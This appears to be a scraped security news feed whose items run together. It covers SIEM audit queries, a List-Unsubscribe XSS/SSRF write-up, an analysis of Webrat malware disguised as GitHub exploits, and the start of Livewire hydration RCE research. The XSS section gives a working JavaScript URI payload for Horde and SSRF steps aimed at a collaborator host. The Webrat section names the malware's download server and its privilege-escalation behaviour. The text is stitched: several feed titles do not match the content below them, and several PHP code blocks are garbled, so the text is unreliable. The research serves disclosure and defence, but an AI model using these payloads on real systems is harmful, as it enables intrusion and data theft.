Due to its complexity, its effectiveness heavily depends on how it is configured and what data sources are connected to it. A one-time SIEM setup during implementation is not enough: both the organization’s infrastructure and attackers’ techniques evolve over time. To operate effectively, the SIEM system must reflect the current state of affairs.We provide customers with services to assess SIEM effectiveness, helping to identify issues and offering options for system optimization. In this article, we examine typical SIEM operational pitfalls and how to address them. For each case, we also include methods for independent verification.This material is based on an assessment of Kaspersky SIEM effectiveness; therefore, all specific examples, commands, and field names are taken from that solution. However, the assessment methodology, issues we identified, and ways to enhance system effectiveness can easily be extrapolated to any other SIEM.Methodology for assessing SIEM effectivenessThe primary audience for the effectiveness assessment report comprises the SIEM support and operation teams within an organization. The main goal is to analyze how well the usage of SIEM aligns with its objectives. Consequently, the scope of checks can vary depending on the stated goals. A standard assessment is conducted across the following areas:Composition and scope of connected data sourcesData flows from existing sourcesCorrectness of data normalizationDetection logic operabilitySIEM technical integration into SOC processesSOC analysts’ handling of alerts in the SIEMForwarding of alerts, security event data, and incident information to other systemsDeployment architecture and documentationAt the same time, these areas are examined not only in isolation but also in terms of their potential influence on one another. Here are a couple of examples illustrating this interdependence:Issues with detection logic due to incorrect data normalization. A correlation rule with the condition deviceCustomString1 not contains <string> triggers a large number of alerts. The detection logic itself is correct: the specific event and the specific field it targets should not generate a large volume of data matching the condition. Our review revealed the issue was in the data ingested by the SIEM, where incorrect encoding caused the string targeted by the rule to be transformed into a different one. Consequently, all events matched the condition and generated alerts.When analyzing coverage for a specific source type, we discovered that the SIEM was only monitoring 5% of all such sources deployed in the infrastructure. However, extending that coverage would increase system load and storage requirements. Therefore, besides connecting additional sources, it would be necessary to scale resources for specific modules (storage, collectors, or the correlator).The effectiveness assessment consists of several stages:Collect and analyze documentation, if available. This allows assessing SIEM objectives, implementation settings (ideally, the deployment settings at the time of the assessment), associated processes, and so on.Interview system engineers, analysts, and administrators. This allows assessing current tasks and the most pressing issues, as well as determining exactly how the SIEM is being operated. Interviews are typically broken down into two phases: an introductory interview, conducted at project start to gather general information, and a follow-up interview, conducted mid-project to discuss questions arising from the analysis of previously collected data.Gather information within the SIEM and then analyze it. This is the most extensive part of the assessment, during which Kaspersky experts are granted read-only access to the system or a part of it to collect factual data on its configuration, detection logic, data flows, and so on.The assessment produces a list of recommendations. Some of these can be implemented almost immediately, while others require more comprehensive changes driven by process optimization or a transition to a more structured approach to system use.Issues arising from SIEM operationsThe problems we identify during a SIEM effectiveness assessment can be divided into three groups:Performance issues, meaning operational errors in various system components. These problems are typically resolved by technical support, but to prevent them, it is worth periodically checking system health status.Efficiency issues – when the system functions normally but seemingly adds little value or is not used to its full potential. This is usually due to the customer using the system capabilities in a limited way, incorrectly, or not as intended by the developer.Detection issues – when the SIEM is operational and continuously evolving according to defined processes and approaches, but alerts are mostly false positives, and the system misses incidents. For the most part, these problems are related to the approach taken in developing detection logic.Key observations from the assessmentWhen building the inventory of event sources for a SIEM, we follow the principle of layered monitoring: the system should have information about all detectable stages of an attack. This principle enables the detection of attacks even if individual malicious actions have gone unnoticed, and allows for retrospective reconstruction of the full attack chain, starting from the attackers’ point of entry.: During effectiveness assessments, we frequently find that the inventory of connected source types is not updated when the infrastructure changes. In some cases, it has not been updated since the initial SIEM deployment, which limits incident detection capabilities. Consequently, certain types of sources remain completely invisible to the system.We have also encountered non-standard cases of incomplete source inventory. For example, an infrastructure contains hosts running both Windows and Linux, but monitoring is configured for only one family of operating systems.: To identify the problems described above, determine the list of source types connected to the SIEM and compare it against what actually exists in the infrastructure. Identifying the presence of specific systems in the infrastructure requires an audit. However, this task is one of the most critical for many areas of cybersecurity, and we recommend running it on a periodic basis.We have compiled a reference sheet of system types commonly found in most organizations. Depending on the organization type, infrastructure, and threat model, we may rearrange priorities. However, a good starting point is as follows:High Priority – sources associated with:
External services accessible from the internetEndpoint operating systemsInformation security toolsMedium Priority – sources associated with:
Remote access management within the perimeterInternal network communicationInfrastructure availabilityVirtualization and cloud solutionsLow Priority – sources associated with:
Applications used by various specialized teams (HR, Development, PR, IT, and so on)Monitoring data flow from sourcesRegardless of how good the detection logic is, it cannot function without telemetry from the data sources.: The SIEM core is not receiving events from specific sources or collectors. Based on all assessments conducted, the average proportion of collectors that are configured with sources but are not transmitting events is 38%. Correlation rules may exist for these sources, but they will, of course, never trigger. It is also important to remember that a single collector can serve hundreds of sources (such as workstations), so the loss of data flow from even one collector can mean losing monitoring visibility for a significant portion of the infrastructure.: The process of locating sources that are not transmitting data can be broken down into two components.Checking collector health. Find the status of collectors (see the support website for the steps to do this in Kaspersky SIEM) and identify those with a status of , , , and so on.Checking the event flow. In Kaspersky SIEM, this can be done by gathering statistics using the following query (counting the number of events received from each collector over a specific time period):SELECT count(ID), CollectorID, CollectorName FROM `events` GROUP BY CollectorID, CollectorName ORDER BY count(ID)
It is essential to specify an optimal time range for collecting these statistics. Too large a range can increase the load on the SIEM, while too small a range may provide inaccurate information for a one-time check – especially for sources that transmit telemetry relatively infrequently, say, once a week. Therefore, it is advisable to choose a smaller time window, such as 2–4 days, but run several queries for different periods in the past.Additionally, for a more comprehensive approach, it is recommended to use built-in functionality or custom logic implemented via correlation rules and lists to monitor event flow. This will help automate the process of detecting problems with sources.: The system is not receiving events from all sources of a particular type that exist in the infrastructure. For example, the company uses workstations and servers running Windows. During SIEM deployment, workstations are immediately connected for monitoring, while the server segment is postponed for one reason or another. As a result, the SIEM receives events from Windows systems, the flow is normalized, and correlation rules work, but an incident in the unmonitored server segment would go unnoticed.: Below are query variations that can be used to search for unconnected sources.SELECT count(distinct, DeviceAddress), DeviceVendor, DeviceProduct FROM  GROUP BY DeviceVendor, DeviceProduct ORDER BY count(ID)SELECT count(distinct, DeviceHostName), DeviceVendor, DeviceProduct FROM  GROUP BY DeviceVendor, DeviceProduct ORDER BY count(ID)We have split the query into two variations because, depending on the source and the DNS integration settings, some events may contain either a  or  field.These queries will help determine the number of unique data sources sending logs of a specific type. This count must be compared against the actual number of sources of that type, obtained from the system owners.Raw data can be useful for developing custom normalizers or for storing events not used in correlation that might be needed during incident investigation. However, careless use of this setting can cause significantly more harm than good.: Enabling the  option effectively doubles the event size in the database, as it stores two copies: the original and the normalized version. This is particularly critical for high-volume collectors receiving events from sources like NetFlow, DNS, firewalls, and others. It is worth noting that this option is typically used for testing a normalizer but is often forgotten and left enabled after its configuration is complete.: This option is applied at the normalizer level. Therefore, it is necessary to review all active normalizers and determine whether retaining raw data is required for their operation.As with the absence of events from sources, normalization issues lead to detection logic failing, as this logic relies on finding specific information in a specific event field.: Several issues related to normalization can be identified:The event flow is not being normalized at all.Events are only partially normalized – this is particularly relevant for custom, non-out-of-the-box normalizers.The normalizer being used only parses headers, such as , placing the entire event body into a single field, this field most often being .An outdated default normalizer is being used.: Identifying normalization issues is more challenging than spotting source problems due to the high volume of telemetry and variety of parsers. Here are several approaches to narrowing the search:First, check which normalizers supplied with the SIEM the organization uses and whether their versions are up to date. In our assessments, we frequently encounter auditd events being normalized by the outdated normalizer, Linux audit and iptables syslog v2 for Kaspersky SIEM. The new normalizer completely reworks and optimizes the normalization schema for events from this source.SELECT count(ID), DeviceProduct, DeviceVendor, CollectorName FROM `events` GROUP BY DeviceProduct, DeviceVendor, CollectorName ORDER BY count(ID)
This query gathers statistics on events from each collector, broken down by the DeviceVendor and DeviceProduct fields. While these fields are not mandatory, they are present in almost any normalization schema. Therefore, their complete absence or empty values may indicate normalization issues. We recommend including these fields when developing custom normalizers.To simplify the identification of normalization problems when developing custom normalizers, you can implement the following mechanism. For each successfully normalized event, add a Name field, populated from a constant or the event itself. For a final catch-all normalizer that processes all unparsed events, set the constant value: . This will later allow you to identify non-normalized events through a simple search on this field.Collected events alone are, in most cases, only useful for investigating an incident that has already been identified. For a SIEM to operate to its full potential, it requires detection logic to be developed to uncover probable security incidents.: The mean correlation rule coverage of sources, determined across all our assessments, is 43%. While this figure is only a ballpark figure – as different source types provide different information – to calculate it, we defined “coverage” as the presence of at least one correlation rule for a source. This means that for more than half of the connected sources, the SIEM is not actively detecting. Meanwhile, effort and SIEM resources are spent on connecting, maintaining, and configuring these sources. In some cases, this is formally justified, for instance, if logs are only needed for regulatory compliance. However, this is an exception rather than the rule.We do not recommend solving this problem by simply not connecting sources to the SIEM. On the contrary, sources should be connected, but this should be done concurrently with the development of corresponding detection logic. Otherwise, it can be forgotten or postponed indefinitely, while the source pointlessly consumes system resources.: This brings us back to auditing, a process that can be greatly aided by creating and maintaining a register of developed detection logic. Given that not every detection logic rule explicitly states the source type from which it expects telemetry, its description should be added to this register during the development phase.If descriptions of the correlation rules are not available, you can refer to the following:The name of the detection logic. With a standardized approach to naming correlation rules, the name can indicate the associated source or at least provide a brief description of what it detects.The use of fields within the rules, such as ,  (another argument for including these fields in the normalizer), , , , , and others. These can help identify the actual source.Excessive alerts generated by the detection logicOne criterion for correlation rules effectiveness is a low false positive rate.: Detection logic generates an abnormally high number of alerts that are physically impossible to process, regardless of the size of the SOC team.: First and foremost, detection logic should be tested during development and refined to achieve an acceptable false positive rate. However, even a well-tuned correlation rule can start producing excessive alerts due to changes in the event flow or connected infrastructure. To identify these rules, we recommend periodically running the following query:SELECT count(ID), Name FROM `events` WHERE Type = 3 GROUP BY Name ORDER BY count(ID)
In Kaspersky SIEM, a value of 3 in the Type field indicates a correlation event.Subsequently, for each identified rule with an anomalous alert count, verify the correctness of the logic it uses and the integrity of the event stream on which it triggered.Depending on the issue you identify, the solution may involve modifying the detection logic, adding exceptions (for example, it is often the case that 99% of the spam originates from just 1–5 specific objects, such as an IP address, a command parameter, or a URL), or adjusting event collection and normalization.SIEM integrations with other systems are generally a critical part of both event processing and alert enrichment. In at least one specific case, their presence directly impacts detection performance: integration with technical Threat Intelligence data or IoCs (indicators of compromise).A SIEM allows conveniently checking objects against various reputation databases or blocklists. Furthermore, there are numerous sources of this data that are ready to integrate natively with a SIEM or require minimal effort to incorporate.: There is no integration with TI data.: Generally, IoCs are integrated into a SIEM at the system configuration level during deployment or subsequent optimization. The use of TI within a SIEM can be implemented at various levels:At the data source level. Some sources, such as NGFWs, add this information to events involving relevant objects.At the SIEM native functionality level. For example, Kaspersky SIEM integrates with CyberTrace indicators, which add object reputation information at the moment of processing an event from a source.At the detection logic level. Information about IoCs is stored in various active lists, and correlation rules match objects against these to enrich the event.Furthermore, TI data does not appear in a SIEM out of thin air. It is either provided by external suppliers (commercially or in an open format) or is part of the built-in functionality of the security tools in use. For instance, various NGFW systems can additionally check the reputation of external IP addresses or domains that users are accessing. Therefore, the first step is to determine whether you are receiving information about indicators of compromise and in what form (whether external providers’ feeds have been integrated and/or the deployed security tools have this capability). It is worth noting that receiving TI data only at the security tool level does not always cover all types of IoCs.If data is being received in some form, the next step is to verify that the SIEM is utilizing it. For TI-related events coming from security tools, the SIEM needs a correlation rule developed to generate alerts. Thus, checking integration in this case involves determining the capabilities of the security tools, searching for the corresponding events in the SIEM, and identifying whether there is detection logic associated with these events. If events from the security tools are absent, the source audit configuration should be assessed to see if the telemetry type in question is being forwarded to the SIEM at all. If normalization is the issue, you should assess parsing accuracy and reconfigure the normalizer.If TI data comes from external providers, determine how it is processed within the organization. Is there a centralized system for aggregating and managing threat data (such as CyberTrace), or is the information stored in, say, CSV files?In the former case (there is a threat data aggregation and management system) you must check if it is integrated with the SIEM. For Kaspersky SIEM and CyberTrace, this integration is handled through the SIEM interface. Following this, SIEM event flows are directed to the threat data aggregation and management system, where matches are identified and alerts are generated, and then both are sent back to the SIEM. Therefore, checking the integration involves ensuring that all collectors receiving events that may contain IoCs are forwarding those events to the threat data aggregation and management system. We also recommend checking if the SIEM has a correlation rule that generates an alert based on matching detected objects with IoCs.In the latter case (threat information is stored in files), you must confirm that the SIEM has a collector and normalizer configured to load this data into the system as events. Also, verify that logic is configured for storing this data within the SIEM for use in correlation. This is typically done with the help of lists that contain the obtained IoCs. Finally, check if a correlation rule exists that compares the event flow against these IoC lists.As the examples illustrate, integration with TI in standard scenarios ultimately boils down to developing a final correlation rule that triggers an alert upon detecting a match with known IoCs. Given the variety of integration methods, creating and providing a universal out-of-the-box rule is difficult. Therefore, in most cases, to ensure IoCs are connected to the SIEM, you need to determine if the company has developed that rule (the existence of the rule) and if it has been correctly configured. If no correlation rule exists in the system, we recommend creating one based on the TI integration methods implemented in your infrastructure. If a rule does exist, its functionality must be verified: if there are no alerts from it, analyze its trigger conditions against the event data visible in the SIEM and adjust it accordingly.The SIEM is not kept up to dateFor a SIEM to run effectively, it must contain current data about the infrastructure it monitors and the threats it’s meant to detect. Both elements change over time: new systems and software, users, security policies, and processes are introduced into the infrastructure, while attackers develop new techniques and tools. It is safe to assume that a perfectly configured and deployed SIEM system will no longer be able to fully see the altered infrastructure or the new threats after five years of running without additional configuration. Therefore, practically all components – event collection, detection, additional integrations for contextual information, and exclusions – must be maintained and kept up to date.Furthermore, it is important to acknowledge that it is impossible to cover 100% of all threats. Continuous research into attacks, development of detection methods, and configuration of corresponding rules are a necessity. The SOC itself also evolves. As it reaches certain maturity levels, new growth opportunities open up for the team, requiring the utilization of new capabilities. The SIEM has not evolved since its initial deployment.: Compare the original statement of work or other deployment documentation against the current state of the system. If there have been no changes, or only minimal ones, it is highly likely that your SIEM has areas for growth and optimization. Any infrastructure is dynamic and requires continuous adaptation.Other issues with SIEM implementation and operationIn this article, we have outlined the primary problems we identify during SIEM effectiveness assessments, but this list is not exhaustive. We also frequently encounter:Mismatch between license capacity and actual SIEM load. The problem is almost always the absence of events from sources, rather than an incorrect initial assessment of the organization’s needs.Lack of user rights management within the system (for example, every user is assigned the administrator role).Poor organization of customizable SIEM resources (rules, normalizers, filters, and so on). Examples include chaotic naming conventions, non-optimal grouping, and obsolete or test content intermixed with active content. We have encountered confusing resource names like [dev] test_Add user to admin group_final2.Use of out-of-the-box resources without adaptation to the organization’s infrastructure. To maximize a SIEM’s value, it is essential at a minimum to populate exception lists and specify infrastructure parameters: lists of administrators and critical services and hosts.Disabled native integrations with external systems, such as LDAP, DNS, and GeoIP.Generally, most issues with SIEM effectiveness stem from the natural degradation (accumulation of errors) of the processes implemented within the system. Therefore, in most cases, maintaining effectiveness involves structuring these processes, monitoring the quality of SIEM engagement at all stages (source onboarding, correlation rule development, normalization, and so on), and conducting regular reviews of all system components and resources.A SIEM is a powerful tool for monitoring and detecting threats, capable of identifying attacks at various stages across nearly any point in an organization’s infrastructure. However, if improperly configured and operated, it can become ineffective or even useless while still consuming significant resources. Therefore, it is crucial to periodically audit the SIEM’s components, settings, detection rules, and data sources.If a SOC is overloaded or otherwise unable to independently identify operational issues with its SIEM, we offer Kaspersky SIEM platform users a service to assess its operation. Following the assessment, we provide a list of recommendations to address the issues we identify. That being said, it is important to clarify that these are not strict, prescriptive instructions, but rather highlight areas that warrant attention and analysis to improve the product’s performance, enhance threat detection accuracy, and enable more efficient SIEM utilization.]]></content:encoded></item><item><title>INTERPOL Arrests 574 in Africa; Ukrainian Ransomware Affiliate Pleads Guilty</title><link>https://thehackernews.com/2025/12/interpol-arrests-574-in-africa.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFfCHIDoU0Y0gTgtyYOReNQ25Fbk3iSVfFgc4C2n8KtajPh773Ap4QVIdosJI0I61aVqcUprFNgBXGdjQJuZLyKzZKylPrm1HlSSKMTeyt3AL75pAULMPnxGTZFZHoCVf7iBjDH3C1tn-Qc7CH5b9PtKMTgI9Lq_86Js9aTmAq5521JepCW7D_-4VXZ0cG/s1600/hackersss.jpg" length="" type=""/><pubDate>Tue, 23 Dec 2025 11:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A law enforcement operation coordinated by INTERPOL has led to the recovery of $3 million and the arrest of 574 suspects by authorities from 19 countries, amidst a continued crackdown on cybercrime networks in Africa.

It allows email clients to provide an easy way for end-users to unsubscribe from mailing lists.This post discusses how this header can be abused to perform Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF) attacks in certain scenarios.
Real-world examples involving  () and  are provided to illustrate the risks.The  SMTP header is defined in  and allows email clients to provide an easy way for end-users to unsubscribe from mailing lists.The List-Unsubscribe field describes the command (preferably using mail) to directly unsubscribe the user (removing them from the list).  List-Unsubscribe: <mailto:list@host.com?subject=unsubscribe>
  List-Unsubscribe: (Use this command to get off the list)
    <mailto:list-manager@host.com?body=unsubscribe%20list>
  List-Unsubscribe: <mailto:list-off@host.com>
  List-Unsubscribe: <http://www.host.com/list.cgi?cmd=unsub&lst=list>,
    <mailto:list-request@host.com?subject=unsubscribe>
In theory, that’s it. Does not sound too exciting for now, right?Easy to miss, but the most interesting example was the very last one, which includes both an HTTP URI and a mailto link. Can we simply add arbitrary  URIs here? What about other schemes?Many modern email clients and webmail applications have implemented support for this header to improve user experience. For example, when an email includes a  header, the client may render a button or link that allows the user to unsubscribe with a single click. This is especially interesting in the context of webmail applications, where the unsubscription process can be initiated directly from the web interface. Anchor tags, URIs, … JavaScript URIs? The possibilities are endless.Alternatively, some webmail applications send the unsubscription request server-side when the end-user clicks the unsubscribe button. This can lead to Server-Side Request Forgery (SSRF) vulnerabilities if the application does not properly validate the provided URI.Stored XSS via JavaScript URI: Horde Webmail (CVE-2025-68673)A real-world example of a Stored Cross-Site Scripting (XSS) vulnerability was identified in Horde (, used with  through ). When an email includes a  SMTP header, a button is rendered within the message detail view that allows users to unsubscribe directly from mailing lists.A malicious actor can exploit this behavior by including a JavaScript URI (), which allows them to execute JavaScript in the origin of the Horde installation when an end-user clicks the link:The following steps can be taken to reproduce the issue:Send an email that includes the JavaScript URI <javascript://lhq.at/%0aconfirm(document.domain)> within the . Adjust  and  as needed:Navigate to Message Detail view (pop-up): https://[REDACTED]/imp/dynamic.php?page=message&buid=10&mailbox=[REDACTED]&token=[REDACTED]&uniq=[REDACTED]Click “List Info”: https://[REDACTED]/imp/dynamic.php?page=message&buid=10&mailbox=[REDACTED]&token=[REDACTED]&uniq=[REDACTED]Notice that the unsubscribe link at https://[REDACTED]/imp/basic.php?page=listinfo&u=[REDACTED]&buid=10&mailbox=SU5CT1g&uniq=[REDACTED] includes the JavaScript URI:Click the link and observe the JavaScript evaluation. Because  is used, you need to either:Use the middle button of your mouse to click the linkRight-click and choose “Open in new tab”This was reported to  on 2024-12-18 but was not yet acknowledged as of 2025-12-18.Blind SSRF: Nextcloud Mail AppNextcloud’s Mail app supports the  SMTP header to unsubscribe from mailing lists:When the end-user unsubscribes, the Nextcloud instance issues a server-side request:During my research, it looked like Nextcloud would allow forging SSRF requests via the  header to arbitrary internal destinations. However, this seems to be possible only if the development configuration flag 'allow_local_remote_servers' => true is set or other supporting factors are present that allow exploitation. This is based on Nextcloud’s evaluation in hackerone.com/reports/2902856.Note that to enable unsubscription via HTTPS, a valid DKIM signature is required. The following Python script expects that you have DKIM set up and have your private key at hand:The following steps can be taken to reproduce the SSRF with external collaborator:Set up DKIM for your domain and update ,  and .Adjust  and .Use the account you will use within the Nextcloud instance as the .Use your own collaborator instance in 'List-Unsubscribe': '<http://abcdef.oastify.com>'.Send the email via .Browse the received email and click .The general recommendation is as simple and self-explanatory as it gets: Consider all input to the application as potentially dangerous, especially when interpreted as a URI/URL.When implementing support for the  SMTP header, webmail applications should:Validate and sanitize the provided URIs to prevent XSS attacks. For example, disallow  URIs. For further guidance, refer to OWASP XSS Prevention Cheat Sheet.Implement proper server-side validation to prevent SSRF attacks. This may include restricting the allowed domains or IP ranges that can be accessed via the unsubscription links. For further guidance, refer to OWASP SSRF Prevention Cheat Sheet.Log unsubscription requests for auditing and monitoring purposes.This post once again showcases that old standards and protocols can still harbor interesting security implications when implemented in modern applications. The  SMTP header, while designed to enhance user experience, can be exploited for XSS and SSRF attacks if not handled properly.If your bug bounty or pentest target includes a webmail application, consider testing the  header for potential vulnerabilities. You might be surprised by what you find!Generally speaking, this research highlights the importance of reading and understanding relevant RFCs and standards when assessing applications that implement them. Even seemingly benign features can introduce significant security risks if not implemented with care.You can directly tweet about this post using this link. 🤓]]></content:encoded></item><item><title>A brush with online fraud: What are brushing scams and how do I stay safe?</title><link>https://www.welivesecurity.com/en/scams/brush-online-fraud-what-are-brushing-scams-how-do-i-stay-safe/</link><author></author><category>threatintel</category><pubDate>Tue, 23 Dec 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[Have you ever received a package you never ordered?

Initially, the Trojan targeted regular users by disguising itself as cheats for popular games like Rust, Counter-Strike, and Roblox, or as cracked software. In September, the attackers decided to widen their net: alongside gamers and users of pirated software, they are now targeting inexperienced professionals and students in the information security field.Distribution and the malicious sampleIn October, we uncovered a campaign that had been distributing Webrat via GitHub repositories since at least September. To lure in victims, the attackers leveraged vulnerabilities frequently mentioned in security advisories and industry news. Specifically, they disguised their malware as exploits for the following vulnerabilities with high CVSSv3 scores:In the Webrat campaign, the attackers bait their traps with both vulnerabilities lacking a working exploit and those which already have one. To build trust, they carefully prepared the repositories, incorporating detailed vulnerability information into the descriptions. The information is presented in the form of structured sections, which include:Overview with general information about the vulnerability and its potential consequencesSpecifications of systems susceptible to the exploitGuide for downloading and installing the exploitGuide for using the exploitSteps to mitigate the risks associated with the vulnerabilityContents of the repositoryIn all the repositories we investigated, the descriptions share a similar structure, characteristic of AI-generated vulnerability reports, and offer nearly identical risk mitigation advice, with only minor variations in wording. This strongly suggests that the text was machine-generated.The Download Exploit ZIP link in the Download & Install section leads to a password-protected archive hosted in the same repository. The password is hidden within the name of a file inside the archive.The archive downloaded from the repository includes four files:pass – 8511: an empty file, whose name contains the password for the archive.payload.dll: a decoy, which is a corrupted PE file. It contains no useful information and performs no actions, serving only to divert attention from the primary malicious file.rasmanesc.exe (note: file names may vary): the primary malicious file (MD5 61b1fc6ab327e6d3ff5fd3e82b430315), which performs the following actions:
Escalate its privileges to the administrator level (T1134.002).Disable Windows Defender (T1562.001) to avoid detection.Fetch from a hardcoded URL (ezc5510min.temp[.]swtest[.]ru in our example) a sample of the Webrat family and execute it (T1608.001).start_exp.bat: a file containing a single command: start rasmanesc.exe, which further increases the likelihood of the user executing the primary malicious file.The execution flow and capabilities of rasmanesc.exeWebrat is a backdoor that allows the attackers to control the infected system. Furthermore, it can steal data from cryptocurrency wallets, Telegram, Discord and Steam accounts, while also performing spyware functions such as screen recording, surveillance via a webcam and microphone, and keylogging. The version of Webrat discovered in this campaign is no different from those documented previously.Previously, Webrat spread alongside game cheats, software cracks, and patches for legitimate applications. In this campaign, however, the Trojan disguises itself as exploits and PoCs. This suggests that the threat actor is attempting to infect information security specialists and other users interested in this topic. It bears mentioning that any competent security professional analyzes exploits and other malware within a controlled, isolated environment, which has no access to sensitive data, physical webcams, or microphones. Furthermore, an experienced researcher would easily recognize Webrat, as it’s well-documented and the current version is no different from previous ones. Therefore, we believe the bait is aimed at students and inexperienced security professionals.The threat actor behind Webrat is now disguising the backdoor not only as game cheats and cracked software, but also as exploits and PoCs. This indicates they are targeting researchers who frequently rely on open sources to find and analyze code related to new vulnerabilities.However, Webrat itself has not changed significantly from past campaigns. These attacks clearly target users who would run the “exploit” directly on their machines — bypassing basic safety protocols. This serves as a reminder that cybersecurity professionals, especially inexperienced researchers and students, must remain vigilant when handling exploits and any potentially malicious files. To prevent potential damage to work and personal devices containing sensitive information, we recommend analyzing these exploits and files within isolated environments like virtual machines or sandboxes.We also recommend exercising general caution when working with code from open sources, always using reliable security solutions, and never adding software to exclusions without a justified reason.Kaspersky solutions effectively detect this threat with the following verdicts:HEUR:Trojan.Python.Agent.genHEUR:Trojan-PSW.Win64.Agent.genHEUR:Trojan-Banker.Win32.Agent.genHEUR:Trojan-PSW.Win32.Coins.genHEUR:Trojan-Downloader.Win32.Agent.gen]]></content:encoded></item><item><title>Default to Deny: Why Network Security Is Shifting to &quot;Zero Trust&quot; ⛔ Ep. 167 ThreatLocker</title><link>https://www.youtube.com/watch?v=aP8j9dgpAs0</link><author>Jack Rhysider</author><category>security</category><enclosure url="https://www.youtube.com/v/aP8j9dgpAs0?version=3" length="" type=""/><pubDate>Tue, 23 Dec 2025 08:00:01 +0000</pubDate><source url="https://www.youtube.com/channel/UCMIqrmh2lMdzhlCPK5ahsAg">Jack Rhysider</source><content:encoded><![CDATA[A manufacturer gets hit with ransomware.

However, this mechanism comes with a critical vulnerability: a dangerous unmarshalling process can be exploited as long as an attacker is in possession of the APP\_KEY of the application. By crafting malicious payloads, attackers can manipulate Livewire’s hydration process to execute arbitrary code, from simple function calls to stealthy remote command execution.

Finally, our research uncovered a pre-authenticated remote code execution vulnerability in Livewire, exploitable even without knowledge of the application’s APP\_KEY. By analyzing Livewire’s recursive hydration mechanism, we found that attackers could inject malicious synthesizers through the updates field in Livewire requests, leveraging PHP’s loose typing and nested array handling. This technique bypasses checksum validation, allowing arbitrary object instantiation and leading to full system compromise.

## Introduction

Livewire has rapidly become one of the most popular full-stack frameworks for Laravel, empowering developers to build dynamic, real-time interfaces with minimal JavaScript. As of 2025, Livewire is used in over **30% of new Laravel projects**, according to community surveys and GitHub trends, making it a cornerstone of modern Laravel development.

According to builtwith, there are currently more than 130K public instances of application based on Livewire.

Livewire uses the concepts of hydration and dehydration to manage component states. When a component is dehydrated, its state is saved and sent to the frontend with a checksum. Upon rehydration, the server verifies the checksum before restoring the component's state. This ensures that the component's state has not been altered during transit.

## Livewire hydration mechanism

### Example of a Livewire update chain

First, let's see how Livewire is integrated on an actual Laravel project to better understand its purpose.

Consider the following simple quickstart example: a basic component that increments or decrements a counter. A Livewire component can be setup with only three files:

- A component stored in `app/Livewire/`:

```
// app/Livewire/Counter.php count++; } public function decrement() { $this->count--; } public function render() { return view('livewire.counter'); } }
```

- A route pointing to this component

```
// routes/web.php  @if($count)  @endif  
```

When a user triggers the increment action on the frontend, a POST request is sent to the server to update the component state.

The request looks like this:

```
POST /livewire/update HTTP/1.1 Host: livewire.local [...] { "_token":"jMEN2kTQRrwSA5CgH5y8WWqbCpdb4Lx4iBznnlFD", "components":[ { "snapshot":"{\"data\":{\"count\":3},\"memo\":{\"id\":\"Y6a883cdUFy82whZ10JW\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"f56c273c0e4a3eaa5d7fdea9e7142c42d0e1128a8aee35e9546baffaa41870ac\"}", "updates":{}, "calls":[ { "path":"", "method":"increment", "params":[] } ] } ] }
```

In this request, two fields are particularly important. First, the `components->snapshot` field contains all the serialized information needed to restore the component’s state on the server side, including the properties and their values. Second, the `components->calls` field defines the list of methods that need to be called on the component, along with any associated parameters.

```
{ "data":{ "count":3 }, "memo":{ "id":"Y6a883cdUFy82whZ10JW", "name":"counter", "path":"counter", "method":"GET", "children":[], "scripts":[], "assets":[], "errors":[], "locale":"en" }, "checksum":"f56c273c0e4a3eaa5d7fdea9e7142c42d0e1128a8aee35e9546baffaa41870ac" }
```

`components->snapshot->data` stores the state of the component. While properties with simple types are sent as raw JSON (for instance, `count` in the previous example), complex types can also be serialized using what Livewire calls Synthetizers.

### Livewire synthesizers

Synthesizers provide a mechanism to define how these custom types should be JSON serialized (dehydrated) and JSON deserialized (hydrated) when sent between the client and server. This ensures that the state of these properties is correctly maintained across requests. By implementing custom Synthesizers, developers can extend Livewire's functionality to recognize and manage various property types used in their applications, enhancing the flexibility and capability of Livewire components.

To be considered a synthesizer, a check is made by Livewire on each payload element using the `isSyntheticTuple` function.

```
1  $child) { 10 $value[$key] = $hydrateChild($key, $child); 11 } 12 return new $meta['class']($value); 13 } 14 }
```

The class defines a static `$key` set to `'clctn'`, which serves as an identifier. This key is used internally by Livewire to associate serialized data with the `CollectionSynth` class during the hydration phase.

When the `hydrate` method is called, it receives a `$value`, which represents the serialized collection data, a `$meta` array containing metadata (such as the name of the original class), and a `$hydrateChild` callback used to individually process each element of the collection. The `$value` is first iterated over, and each item is passed through the `$hydrateChild` function to ensure nested, or complex types are properly rehydrated. Once all elements are processed, a new instance of the original collection class is created using the reconstructed array.

In short, `CollectionSynth` is what allows Livewire to maintain the integrity and functionality of PHP collection objects across frontend-backend communication, making sure that when collections are sent back from the browser, they are restored to their correct PHP class form.

#### FormObjectSynth

The `FormObjectSynth` class is used to handle the (de)hydration of special "form objects" tied to a Livewire component, while ensuring they remain properly linked to the component context.

```
1 context->component, $this->path); 12 $callBootMethod = static::bootFormObject($this->context->component, $form, $this->path); 13 14 foreach ($data as $key => $child) { 15 if ($child === null && Utils::propertyIsTypedAndUninitialized($form, $key)) { 16 continue; 17 } 18 19 $form->$key = $hydrateChild($key, $child); 20 } 21 $callBootMethod(); 22 return $form; 23 } 24 }
```

The class defines a static `$key` set to `'form'`, which acts as an identifier allowing Livewire to recognize serialized data that should be handled by `FormObjectSynth`. When hydration occurs, the `hydrate` method is called with `$data`, `$meta`, and a `$hydrateChild` callback. The `$meta` array contains metadata, including the class name of the form object to instantiate. Although `$meta` is user-controlled, the `$this->context` and `$this->path` values used during instantiation are not, which means that only objects whose constructors accept two or fewer weakly-typed parameters (typically the component and a path) can be instantiated successfully.

Inside the `hydrate` method, a new form object is created, and a boot method is optionally called to initialize it further. After that, a loop iterates over the `$data` array, which represents the serialized form fields. Each field is passed through `$hydrateChild` to allow nested structures to be properly restored. These hydrated values are then assigned directly to the corresponding public properties of the form object. As a result, any public property of the instantiated object can be set with controlled values, giving great flexibility in reconstructing the object's internal state based on the incoming data.

In essence, `FormObjectSynth` makes it possible for Livewire to rebuild form objects attached to components, ensuring that they are fully hydrated with the correct structure and values when received from the frontend.

#### ModelSynth

